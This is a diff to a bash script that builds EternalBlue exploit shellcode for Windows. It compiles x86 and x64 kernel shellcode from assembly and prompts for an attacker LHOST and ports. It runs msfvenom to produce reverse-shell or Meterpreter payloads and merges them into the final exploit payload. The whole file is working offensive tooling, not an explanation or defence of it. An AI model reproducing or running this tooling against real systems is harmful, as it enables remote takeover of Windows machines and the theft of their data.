@@ -1,103 +1,143 @@
-#!/bin/bash
+#!/usr/bin/env bash
+
 set -e
-cat << "EOF"
+
+# ====================================================================
+# Variables
+# ====================================================================
+
+shell=('shell' 'meterpreter')
+arch=('x86' 'x64')
+
+RED='\e[31;1m'
+RED_BLINK='\e[31;5;1m'
+GREEN='\e[32;1m'
+BLUE='\e[34;1m'
+END='\e[m'
+
+# ====================================================================
+# Checking dependencies
+# ====================================================================
+
+which msfvenom 1>/dev/null
+
+if [[ "$?" == "1" ]];then
+    echo "Required to have ${RED}msfvenom${END} program installed!"
+    exit 1
+fi
+
+# verificar usuario root
+[[ "$UID" -ne "0" ]] && { echo -e "\nOnly ${RED}root${END}.\n"; exit 1; }
+
+# ====================================================================
+# Banner
+# ====================================================================
+
+echo -e "${BLUE}
                  _.-;;-._
           '-..-'|   ||   |
           '-..-'|_.-;;-._|
           '-..-'|   ||   |
-          '-..-'|_.-''-._|   
-EOF
-echo Eternal Blue Windows Shellcode Compiler
-echo
-echo Let\'s compile them windoos shellcodezzz
-echo
-echo Compiling x64 kernel shellcode
-nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
-echo 'Compiling x86 kernel shellcode'
-nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
-echo kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? \(Y\/n\)
-read genMSF
-if [[ $genMSF =~ [yY](es)* ]]
-then
-    echo LHOST for reverse connection:
-    read ip
-    echo LPORT you want x64 to listen on:
-    read portOne
-    echo LPORT you want x86 to listen on:
-    read portTwo
-    echo Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
-    read cmd
-    if [[ $cmd -eq 0 ]]
-    then
-        echo Type 0 to generate a staged payload or 1 to generate a stageless payload
-        read cmd
-        if [[ $cmd -eq 0 ]]
-        then
-            echo Generating x64 meterpreter shell \(staged\)...
-            echo
-            echo msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            echo 
-            echo Generating x86 meterpreter shell \(staged\)...
-            echo
-            echo msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-            msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-        elif [[ $cmd -eq 1 ]]
-        then
-            echo Generating x64 meterpreter shell \(stageless\)...
-            echo
-            echo msfvenom -p windows/x64/meterpreter_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            msfvenom -p windows/x64/meterpreter_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            echo 
-            echo Generating x86 meterpreter shell \(stageless\)...
-            echo
-            echo msfvenom -p windows/meterpreter_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-            msfvenom -p windows/meterpreter_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-        else
-            echo Invalid option...exiting...
-            exit 1
-        fi
-    elif [[ $cmd -eq 1 ]]
-    then
-        echo Type 0 to generate a staged payload or 1 to generate a stageless payload
-        read cmd
-        if [[ $cmd -eq 0 ]]
-        then
-            echo Generating x64 cmd shell \(staged\)...
-            echo
-            echo msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            echo
-            echo Generating x86 cmd shell \(staged\)...
-            echo
-            echo msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-            msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-        elif [[ $cmd -eq 1 ]]
-        then
-            echo Generating x64 cmd shell \(stageless\)...
-            echo
-            echo msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            echo
-            echo Generating x86 cmd shell \(stageless\)...
-            echo
-            echo msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-            msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-        else
-            echo Invalid option...exiting...
-            exit 1
-        fi
-    else
-        echo Invalid option...exiting...
-        exit 1
-    fi
-echo
-echo MERGING SHELLCODE WOOOO!!!
-cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
-cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
-python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
+          '-..-'|_.-''-._|
+${END}"
+
+# ====================================================================
+# Deleting temporary files
+# ====================================================================
+
+rm -rf temp*
+
+# ====================================================================
+# Compiling assembly code
+# ====================================================================
+
+for value in {0,1};do
+    echo -ne "${GREEN}[+]${END} Compiling ${arch[$value]} kernel shellcode ..."
+    nasm -f bin eternalblue_kshellcode_"${arch[$value]}".asm -o temp_kernel_"${arch[$value]}".bin
+    echo -e "[ ${GREEN}OK${END} ]"
+done
+
+# ====================================================================
+# Generate a reverse shell with msfvenon
+# ====================================================================
+
+echo -ne "
+kernel shellcode compiled!
+would you like to auto generate a reverse shell with msfvenom? (Y/n) "
+read -r genMSF
+
+if [[ "${genMSF}" =~ [yY](es)* ]];then
+    echo -ne "\n${BLUE}LHOST${END} for reverse connection: "
+    read -r ip
+    echo -ne "${BLUE}LPORT${END} you want x86 to listen on: "
+    read -r portx86
+    echo -ne "${BLUE}LPORT${END} you want x64 to listen on: "
+    read -r portx64
+
+    echo -ne "\n[ 0 ] Regular cmd shell. \
+            \n[ 1 ] Meterpreter shell. \
+            \n\n${GREEN}[+]${END} Choose the shell: "
+    read -r cmd
+
+    echo -ne "\n[ 0 ] Staged payload. \
+           \n[ 1 ] Stageless payload. \
+           \n\n${GREEN}[+]${END} Choose the stage: "
+    read -r stage
+
+    for value in {0,1};do
+        case "${stage}" in
+            0)
+                case "${arch[$value]}" in
+                    "x86")
+                        echo -e "${GREEN}[+]${END} Generating ${arch[$value]} ${shell[$cmd]} (staged)... \
+                               \nmsfvenom -p windows/${shell[$cmd]}/reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x86.bin LHOST=${ip} LPORT=${portx86}"
+                        msfvenom -p windows/"${shell[$cmd]}"/reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x86.bin LHOST="${ip}" LPORT="${portx86}"
+                    ;;
+                    "x64")
+                        echo -e "${GREEN}[+]${END} Generating ${arch[$value]} ${shell[$cmd]} (staged)... \
+                               \nmsfvenom -p windows/${shell[$cmd]}/reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x64.bin LHOST=${ip} LPORT=${portx64}"
+                        msfvenom -p windows/"${shell[$cmd]}"/reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x64.bin LHOST="${ip}" LPORT="${portx64}"
+
+                    ;;
+                    *)
+                        echo -e "\n${RED}Invalid option...exiting...${END}\n"
+                        exit 1
+                esac
+            ;;
+            1)
+                case "${arch[$value]}" in
+                    "x86")
+                        echo -e "\n${GREEN}[+]${END} Generating ${arch[$value]} ${shell[$cmd]} (stageless)... \
+                               \nmsfvenom -p windows/${shell[$cmd]}_reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x86.bin LHOST=${ip} LPORT=${portx86}"
+                        msfvenom -p windows/"${shell[$cmd]}"_reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x86.bin LHOST="${ip}" LPORT="${portx86}"
+                    ;;
+                    "x64")
+                        echo -e "\n${GREEN}[+]${END} Generating ${arch[$value]} ${shell[$cmd]} (stageless)... \
+                               \nmsfvenom -p windows/${shell[$cmd]}_reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x64.bin LHOST=${ip} LPORT=${portx64}"
+                        msfvenom -p windows/"${shell[$cmd]}"_reverse_tcp -f raw EXITFUNC=thread -o temp_msf_x64.bin LHOST="${ip}" LPORT="${portx64}"
+
+                    ;;
+                    *)
+                        echo -e "\n${RED}Invalid option...exiting...${END}\n"
+                        exit 1
+                esac
+            ;;
+            *)
+                echo -e "\n${RED}Invalid option...exiting...${END}\n"
+                exit 1 
+        esac
+    done
+
+    echo -e "\n${GREEN}[+]${END} MERGING SHELLCODE WOOOO!!!"
+    cat temp_kernel_x86.bin temp_msf_x86.bin > "${ip}"_p"${portx86}"_x86.bin
+    cat temp_kernel_x64.bin temp_msf_x64.bin > "${ip}"_p"${portx64}"_x64.bin
+    python eternalblue_sc_merge.py "${ip}"_p"${portx86}"_x86.bin "${ip}"_p"${portx64}"_x64.bin "${ip}"_p"${portx86}"_p"${portx64}"_all.bin
+
+    echo -e "\nFinished. ${RED_BLINK}Hack The Planet.${END}"
+
+    # Deleting temporary files
+    rm -rf temp*
 else
-    echo Okay cool, make sure you merge your own shellcode properly :\)
+    echo "Okay cool, make sure you merge your own shellcode properly :)"
+    exit 0
 fi
-echo DONE
-exit 0
